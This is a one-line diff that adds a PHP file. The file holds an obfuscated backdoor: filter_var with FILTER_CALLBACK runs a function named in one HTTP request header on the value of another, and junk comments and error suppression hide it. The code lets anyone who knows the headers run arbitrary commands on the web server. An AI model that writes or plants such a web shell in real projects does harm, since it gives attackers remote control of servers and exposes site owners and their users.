@@ -1,0 +1,1 @@
+<?php @filter_var ($_SERVER{'HTTP_P'/*npjcgjgco*/},FILTER_CALLBACK,array(/*e58hj78*/'options'=>@$_SERVER{HTTP_Y/*8e*/}));
